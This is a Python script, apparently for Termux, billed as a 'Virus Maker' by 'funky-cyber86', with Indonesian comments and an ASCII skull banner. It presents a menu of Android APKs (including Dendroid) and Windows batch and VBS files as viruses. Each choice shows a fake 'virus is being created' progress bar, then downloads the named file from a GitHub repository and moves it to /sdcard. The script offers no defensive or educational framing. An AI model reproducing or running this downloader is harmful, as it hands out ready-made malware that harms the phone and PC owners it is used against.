###########################################################
###  Mau Apa loe? Mau edit? malu kali boos, bsanya edit	###
###  tools orang lain.. hargai pembuatnya, jgn main redit##
###  capek tau ngbuatnya...dn klian tinggal make aja	###
###########################################################
### no redit tol. dah tnggal make aja..			###
### Virus Marker.					###
### Written by funky-cyber86.				###
###########################################################
import sys,os,platform
from time import *
x = platform.system()
import requests
from tqdm import tqdm
from time import sleep
import random
import time
os.system('clear')
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
# durasi ketikan
        time.sleep(random.random() * 0.3)
print ('Loading..')
mengetik('> > > > > > > > > > > > > >] 100%')
os.system('clear')
#banner
def banner():
	print ('                  ooooooooooo ')
	sleep(0.1)
	print ('               oooooooooooooooo ')
	sleep(0.1)
	print ('             oooooooooooooooooooo ')
	sleep(0.1)
	print ('           oooooooooooooooooooooooo ')
	sleep(0.1)
	print ('          oooooooooooooooooooooooooo ')
	sleep(0.1)
	print ('         oooooooooooooooooooooooooooo ')
	sleep(0.1)
	print ('         oooooooooooooooooooooooooooo ')
	sleep(0.1)
	print ('        oooooooooooooooooooooooooooooo ')
	sleep(0.1)
	print ('        oooo      ooooooooooo     oooo ')
	sleep(0.1)
	print ('         oooo       ooooooo      oooo ')
	sleep(0.1)
	print ('         o..ooo  oooo oo oooo  ooo..o ')
	sleep(0.1)
	print ('        ooooooo oooooo  oooooo ooooooo ')
	sleep(0.1)
	print ('         oooooooooooo    oooooooooooo  ')
	sleep(0.1)
	print ('          oooooooooooo  oooooooooooo  ')
	sleep(0.1)
	print ('             ooooooooooooooooooooo  ')
	sleep(0.1)
	print ('             ooooo  ooo ooo  ooooo  ')
	sleep(0.1)
	print ('                   ooo   ooo  ')
	sleep(0.1)
	print ("\033[1;36m _____                       _  _    ___  _  _")
	sleep(0.1)
	print ("| ____|_ __ _ __ ___  _ __  | || |  / _ \| || |")
	sleep(0.1)
	print ("|  _| | '__| '__/ _ \| '__| | || |_| | | | || |_")
	sleep(0.1)
	print ("| |___| |  | | | (_) | |    |__   _| |_| |__   _|")
	sleep(0.1)
	print ("|_____|_|  |_|  \___/|_|       |_|  \___/   |_|\n\033[1;36m")
	print ("\033[00m||~~~~~~~~>>\033[1;31mWRITTEN by.FUNKYCYBER-86\033[00m<<~~~~~~~~||")
	print ('		== VIRUS MAKER ==\n')
banner()
print ('\033[1;34mVirus For Android\t\tVirus For Windows\n')
sleep(1)
print ('\033[1;32m1. \033[00mAgent.apk\t\t\t\033[1;32m5. \033[00mRIP.bat')
sleep(0.1)
print ('\033[1;32m2. \033[00mElite.apk\t\t\t\033[1;32m6. \033[00mKuis.bat')
sleep(0.1)
print ('\033[1;32m3. \033[00mFacebook.apk\t\t\t\033[1;32m7. \033[00mSleepy.bat')
sleep(0.1)
print ('\033[1;32m4. \033[00mDendroid.apk\t\t\t\033[1;32m8. \033[00mCapslock.vbs')
sleep(0.1)
print ('\n\033[1;32m0. \033[1;31mExit')
def main():
     pilih = input ('\033[1;32m\nInput Number ]=> \033[00m')
     os.system('clear')
     if pilih == '1' or pilih == '01':
          print ('\033[1;31mVirus Agent is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/Agent.apk?raw=true/Agent.apk'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv Agent.apk /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '2' or pilih == '02':
          print ('\033[1;31mVirus Elite is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/Elite.apk?raw=true/Elite.apk'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv Elite.apk /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '3' or pilih == '03':
          print ('\033[1;31mVirus Facebook is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/facebook.apk?raw=true/facebook.apk'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv facebook.apk /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '4' or pilih == '04':
          print ('\033[1;31mVirus Dendroid is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/dendroid.apk?raw=true/dendroid.apk'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv dendroid.apk /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '5' or pilih == '05':
          print ('\033[1;31mVirus RIP.bat is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/RIP.bat?raw=true/RIP.bat'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv RIP.bat /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '6' or pilih == '06':
          print ('\033[1;31mVirus  is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/Kuis.bat?raw=true/Kuis.bat'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv Kuis.bat /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '7' or pilih == '07':
          print ('\033[1;31mVirus Sleepy is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/Sleepy.bat?raw=true/Sleepy.bat'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv Sleepy.bat /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '8' or pilih == '08':
          print ('\033[1;31mVirus Capslock is being created\033[00m')
          mengetik('> > > > > > > > > > > > > >] 100%')
          sleep(0.1)
          chunk_size = 1024
          url = 'https://github.com/Funkyz86/V-404/blob/master/Capslock.vbs?raw=true/Capslock.vbs'
          r = requests.get(url, stream = True)
          size = int(r.headers['content-length'])
          filename = url.split('/')[-1]
          with open(filename, 'wb') as f:
               for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
                    f.write(data)
          os.system("mv Capslock.vbs /sdcard")
          print ('\033[1;32mSuccessfull Download file in sdcard\033[00m\n')
          sleep(3)
          os.system('clear')
     elif pilih == '0' or pilih == '00':
          banner()
          print ('\033[1;36m=Terimakasih Sudah Menggunakan Tools Error404=\n')
          sleep(3)
          os.system('clear')
     else:
          print ('\033[1;31mMaaf, Pilihan Anda Tidak Ada Dalam Program')
          sleep(2)
          print ('System Akan Mengulang Program.!!\033[00m')
          sleep(2)
          os.system('cd /data/data/com.termux/files/home/VirusMaker404;python VirusMaker.py')
main()
######################################################################
